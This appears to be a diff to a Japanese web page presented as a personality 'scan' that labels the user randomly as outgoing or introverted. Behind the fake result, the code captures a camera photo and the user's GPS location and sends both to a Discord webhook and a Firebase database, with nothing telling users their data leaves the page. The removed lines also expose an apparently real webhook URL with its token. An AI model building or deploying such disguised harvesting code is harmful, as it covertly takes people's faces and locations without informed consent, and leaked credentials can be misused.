@@ -48,55 +48,57 @@
             .catch(err => alert("カメラを許可してください"));
 
         btn.onclick = () => {
-            btn.disabled = true;
-            resultDiv.innerText = "スキャン中...";
+    btn.disabled = true;
+    resultDiv.innerText = "1: 位置情報を取得中..."; // どこまで進んだか表示
 
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const lat = pos.coords.latitude;
-                const lng = pos.coords.longitude;
+    navigator.geolocation.getCurrentPosition(async (pos) => {
+        resultDiv.innerText = "2: 写真をキャプチャ中...";
+        const lat = pos.coords.latitude;
+        const lng = pos.coords.longitude;
 
-                // 写真キャプチャ
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const imageData = canvas.toDataURL('image/jpeg');
-                const blob = await (await fetch(imageData)).blob();
+        try {
+            // 写真キャプチャ
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const imageData = canvas.toDataURL('image/jpeg');
+            const blob = await (await fetch(imageData)).blob();
 
-                // 診断結果
-                const res = Math.random() > 0.5 ? "陽キャ" : "陰キャ";
+            const res = Math.random() > 0.5 ? "陽キャ" : "陰キャ";
 
-                try {
-                    // 【2】DiscordのWebhook URLをここに貼る
-                    const webhookUrl = "https://discord.com/api/webhooks/1475357385492136098/7L3L92yDhZhsjeQAh9NgcgOeS4ESaaCUvYda9-d4EW4Juxey1rX3gZ-BXLI6qgl02IA_";
+            resultDiv.innerText = "3: Discordへ送信中...";
+            
+            // Discord送信
+            const webhookUrl = "あなたのURL";
+            const formData = new FormData();
+            formData.append("content", `【新着】結果: ${res}\n場所: https://www.google.com/maps?q=${lat},${lng}`);
+            formData.append("file", blob, "face.jpg");
 
-                    // Discord送信
-                    const formData = new FormData();
-                    formData.append("content", `【新着】結果: ${res}\n場所: https://www.google.com/maps?q=${lat},${lng}`);
-                    formData.append("file", blob, "face.jpg");
+            await fetch(webhookUrl, { method: "POST", body: formData });
 
-                    await fetch(webhookUrl, { method: "POST", body: formData });
-
-                    // Firebaseに文字データだけ保存
-                    await addDoc(collection(db, "results"), {
-                        result: res,
-                        location: { lat, lng },
-                        timestamp: serverTimestamp()
-                    });
-
-                    resultDiv.innerText = "結果: " + res;
-                    alert("診断完了！");
-                } catch (e) {
-                    console.error(e);
-                    alert("送信に失敗しました");
-                } finally {
-                    btn.disabled = false;
-                }
-
-            }, (err) => {
-                alert("位置情報を許可してください");
-                btn.disabled = false;
+            resultDiv.innerText = "4: Firebaseへ記録中...";
+            
+            // Firebase保存
+            await addDoc(collection(db, "results"), {
+                result: res,
+                location: { lat, lng },
+                timestamp: serverTimestamp()
             });
-        };
+
+            resultDiv.innerText = "結果: " + res;
+            alert("診断完了！");
+        } catch (e) {
+            console.error(e);
+            resultDiv.innerText = "エラー発生: " + e.message;
+        } finally {
+            btn.disabled = false;
+        }
+
+    }, (err) => {
+        resultDiv.innerText = "位置情報エラー: " + err.message;
+        btn.disabled = false;
+    }, { timeout: 10000 }); // 10秒でタイムアウト
+};
     </script>
 </body>
 </html>
